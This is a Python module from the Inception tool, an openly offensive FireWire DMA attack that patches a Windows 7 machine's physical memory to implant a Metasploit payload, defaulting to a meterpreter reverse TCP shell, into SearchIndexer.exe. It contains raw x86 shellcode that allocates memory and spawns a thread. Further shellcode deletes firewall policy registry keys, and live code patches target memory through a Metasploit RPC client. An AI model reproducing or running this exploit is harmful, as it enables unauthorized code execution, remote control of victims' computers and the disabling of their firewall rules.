'''
Inception - a FireWire physical memory manipulation and hacking tool exploiting
IEEE 1394 SBP-2 DMA.

Copyright (C) 2011-2013  Carsten Maartmann-Moe

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.

Created on Dec 5, 2013

@author: Carsten Maartmann-Moe <carsten@carmaa.com> aka ntropy
'''
from inception import terminal
from inception.exceptions import InceptionException
from inception.external.pymetasploit.metasploit.msfrpc import MsfRpcClient, MsfRpcError, PayloadModule
from inception.memory import Target, Signature, Chunk


IS_INTRUSIVE = True

term = terminal.Terminal()

info = 'This module implants a (potentially memory-only) Metasploit ' \
       'payload directly to the volatile memory of the target machine.'

# class InfectSignature(collections.namedtuple('InfectSignature',
#                                              Signature._fields +
#                                              ('primary', 'staged'))):
#     '''
#     An extension of the Signature class, with the added 'primary' field that
#     allows distinguishing between primary and backup signatures.

#     Mandatory additional keyword arguments:
#     - primary: Set to True if this is the primary signature
#     - staged: Set to True if the signature need to be staged (allocate page)
#     '''
#     pass

# Exit function hashes

# kernel32.dll!SetUnhandledExceptionFilter (0xEA320EFE) - This exit function
# will let the UnhandledExceptionFilter function perform its default handling
# routine.

# kernel32.dll!ExitProcess (0x56A2B5F0) - This exit function will force the
# process to terminate.

# kernel32.dll!ExitThread (0x0A2A1DE0) - This exit function will force the
# current thread to terminate. On Windows 2008, Vista and 7 this function is
# a forwarded export to ntdll.dll!RtlExitUserThread and as such cannot be
# called by the api_call function.

# ntdll.dll!RtlExitUserThread (0x6F721347) - This exit function will force
# the current thread to terminate. This function is not available on Windows
# NT or 2000.
SEH = 0xea320efe         # kernel32.dll!SetUnhandledExceptionFilter
PROCESS = 0x56a2b5f0     # kernel32.dll!ExitProcess
THREAD = 0x0a2a1de0      # kernel32.dll!ExitThread
USERTHREAD = 0x6f721347  # ntdll.dll!RtlExitUserThread

shellcode = {
    'alloc_page':
    b'\xe8\x00\x00\x00\x00\x60\xfc\xe8\x89\x00\x00\x00\x60\x89' +
    b'\xe5\x31\xd2\x64\x8b\x52\x30\x8b\x52\x0c\x8b\x52\x14\x8b' +
    b'\x72\x28\x0f\xb7\x4a\x26\x31\xff\x31\xc0\xac\x3c\x61\x7c' +
    b'\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52' +
    b'\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01' +
    b'\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b' +
    b'\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d\x01\xc7' +
    b'\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58\x8b' +
    b'\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b' +
    b'\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51' +
    b'\xff\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\xbe\x00\x01\x00' +
    b'\x00\x6a\x40\x68\x00\x10\x00\x00\x56\x6a\x00\x68\x58\xa4' +
    b'\x53\xe5\xff\xd5\x66\xc7\x00\xff\xe0\xff\xe0',
    'create_thread':
    b'\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52' +
    b'\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26' +
    b'\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d' +
    b'\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0' +
    b'\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b' +
    b'\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff' +
    b'\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d' +
    b'\xf8\x3b\x7d\x24\x75\xe2\x58\x8b\x58\x24\x01\xd3\x66\x8b' +
    b'\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44' +
    b'\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b' +
    b'\x12\xeb\x86\x5d\x31\xc0\x50\x50\x50\x8d\x9d\xa8\x00\x00' +
    b'\x00\x53\x50\x50\x68\x38\x68\x0d\x16\xff\xd5\x61\x81\x2c' +
    b'\x24\x05\x00\x00\x00\xc3\x58',
    'reg_delete':
    b'\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52' +
    b'\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26' +
    b'\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d' +
    b'\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0' +
    b'\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b' +
    b'\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff' +
    b'\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d' +
    b'\xf8\x3b\x7d\x24\x75\xe2\x58\x8b\x58\x24\x01\xd3\x66\x8b' +
    b'\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44' +
    b'\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b' +
    b'\x12\xeb\x86\x5d\x6a\x00\x8d\x85\x9f\x00\x00\x00\x50\x68' +
    b'\x31\x8b\x6f\x87\xff\xd5\xe9\x2b\x01\x00\x00\x63\x6d\x64' +
    b'\x20\x2f\x63\x20\x22\x72\x65\x67\x20\x64\x65\x6c\x65\x74' +
    b'\x65\x20\x48\x4b\x4c\x4d\x5c\x53\x59\x53\x54\x45\x4d\x5c' +
    b'\x43\x75\x72\x72\x65\x6e\x74\x43\x6f\x6e\x74\x72\x6f\x6c' +
    b'\x53\x65\x74\x5c\x73\x65\x72\x76\x69\x63\x65\x73\x5c\x53' +
    b'\x68\x61\x72\x65\x64\x41\x63\x63\x65\x73\x73\x5c\x50\x61' +
    b'\x72\x61\x6d\x65\x74\x65\x72\x73\x5c\x46\x69\x72\x65\x77' +
    b'\x61\x6c\x6c\x50\x6f\x6c\x69\x63\x79\x5c\x52\x65\x73\x74' +
    b'\x72\x69\x63\x74\x65\x64\x53\x65\x72\x76\x69\x63\x65\x73' +
    b'\x5c\x53\x74\x61\x74\x69\x63\x5c\x53\x79\x73\x74\x65\x6d' +
    b'\x20\x2f\x76\x20\x53\x65\x61\x72\x63\x68\x49\x6e\x64\x65' +
    b'\x78\x65\x72\x2d\x31\x20\x2f\x66\x20\x26\x20\x72\x65\x67' +
    b'\x20\x64\x65\x6c\x65\x74\x65\x20\x48\x4b\x4c\x4d\x5c\x53' +
    b'\x59\x53\x54\x45\x4d\x5c\x43\x75\x72\x72\x65\x6e\x74\x43' +
    b'\x6f\x6e\x74\x72\x6f\x6c\x53\x65\x74\x5c\x73\x65\x72\x76' +
    b'\x69\x63\x65\x73\x5c\x53\x68\x61\x72\x65\x64\x41\x63\x63' +
    b'\x65\x73\x73\x5c\x50\x61\x72\x61\x6d\x65\x74\x65\x72\x73' +
    b'\x5c\x46\x69\x72\x65\x77\x61\x6c\x6c\x50\x6f\x6c\x69\x63' +
    b'\x79\x5c\x52\x65\x73\x74\x72\x69\x63\x74\x65\x64\x53\x65' +
    b'\x72\x76\x69\x63\x65\x73\x5c\x53\x74\x61\x74\x69\x63\x5c' +
    b'\x53\x79\x73\x74\x65\x6d\x20\x2f\x76\x20\x53\x65\x61\x72' +
    b'\x63\x68\x49\x6e\x64\x65\x78\x65\x72\x2d\x32\x20\x2f\x66' +
    b'\x22\x00'
}

stage1 = Target(
    name='Allocate page',
    note='Create page, copy signature to it and jump to page',
    signatures=[
        Signature(
            offsets=[0x18c],
            chunks=[
                Chunk(
                    chunk=0x8bff558bec813D,
                    chunkoffset=0,
                    patch=shellcode['alloc_page'],
                    patchoffset=0)
                ],
            os='Windows 7',
            os_versions=['SP0'],
            os_architectures=['x86'],
            executable='SearchIndexer.exe',
            version='',
            md5='',
            tag=False)
        ]
    )

# stage2 = {
# 'x86': Target(
#     name='Create and execute thread',
#     note='Create a new thread with the MSF payload, execute it, restore ' \
#          'stack and return to caller',
#     signatures=[
#         Signature(
#             offsets=[0],
#             chunks=[
#                 Chunk(
#                     chunk=0xffe0000000000000,
#                     chunkoffset=0,
#                     patch=shellcode['alloc_page'],
#                     patchoffset=0)
#                 ],
#             os='Windows 7',
#             os_versions=['SP0'],
#             os_architectures=['x86'],
#             executable='SearchIndexer.exe',
#             version='',
#             md5='',
#             tag=False)
#         ]),
# 'x64': None}


def add_options(group):
    group.add_option('--msfopts',
                     dest='msfopts',
                     help='exploit options in a comma-separated list using '
                          'the format \'OPTION=value\'')
    group.add_option('--msfpw',
                     dest='msfpw',
                     help='password for the MSFRPC daemon')


def str2dict(str):
    '''
    Returns a dict from a string formatted as OPTION1=value,OPTION2=value
    '''
    return dict([x.split('=') for x in str.split(',')])


def set_opts(module, msfopts):
    '''
    Sets MSF options given the selected module
    '''
    if msfopts:
        useropts = str2dict(msfopts)
        for opt in useropts:
            module[opt] = useropts[opt]


# def set_exitfunc(payload, exitfunk):
#     '''
#     Sets the exitfunc of a payload by manipulating the binary string
#     '''
#     pass  # TODO


def run(opts, memspace):

    # Connect to msf and generate shellcode(s)
    try:
        client = MsfRpcClient(opts.msfpw)
    except MsfRpcError as e:
        raise InceptionException('Could not connect to Metasploit: {0}'
                                 .format(e))

    name = term.poll('What MSF payload do you want to use?',
                     default='windows/meterpreter/reverse_tcp')
    try:
        module = PayloadModule(client, name)
        set_opts(module, opts.msfopts + ',EXITFUNC=thread')
        payload = module.execute(Encoder='generic/none').get('payload')
    except MsfRpcError as e:
        raise InceptionException('Could not get Metasploit payload: {0}'
                                 .format(e))

    # term.poll('Options:')
    # options = {'LHOST': 'localhost'}
    #module['LHOST'] = '192.168.0.8'
    # module['ForceEncode'] = False
    # module['-t'] = 'raw'
    # opts = {'ForceEncode': False}
    # try:
        
    # except MsfRpcError as e:
    #     term.fail(e)

    needed = [x for x in module.required if x not in module.advanced]
    term.info('Selected options:')
    for o in needed:
        term.info('{0}: {1}'.format(o, module[o]))
    
    # print(payload)
    # print(util.bytes2hexstr(payload))

    # TODO: Allow users to set required options

    # STAGE 1
    address, signature, offset = memspace.find(stage1)
    
    # Signature found, let's patch
    term.found_at(address, memspace.page_no(address))
    backup = memspace.patch(address, signature.chunks)
    input()
    # Figure out what os & architecture we're attacking and select stage
    # TODO: For now, just select x86
    # target = stage2[signature.os_architectures[0]]

    # TODO: Modify payload exitfunk that is used if the payload fails

    # STAGE 2
    # Concatenate shellcode and payload
    # payload = shellcode['create_thread'] + shellcode['edit_reg'] + payload
    payload = shellcode['create_thread'] + shellcode['reg_delete'] + payload

    # Replace EXITFUNC with THREAD (it's hardcoded as PROCESS)
    # This helps ensure that the process doesn't crash if the exploit fails

    # Write back original, backed up page
    memspace.write(address, backup)
    input()
    # Search for the newly allocated page with our signature
    address, signature, offset = memspace.rawfind(0, 0xffe0000000000000)
    # Signature found, let's patch
    term.found_at(address, memspace.page_no(address))
    input()
    memspace.write(address, payload)

    # Copy off original memory content in the region where stage 1 will be
    # written

    # Patch with stage 1 - allocates a memory page and writes signature to
    # frame boundary, and jumps to it

    # Search for signature

    # Restore the original memory content where stage 1 was written (overwrite
    # it)

    # Patch with stage 2 - forks / creates and executes a new thread with
    # prepended shellcode
    pass
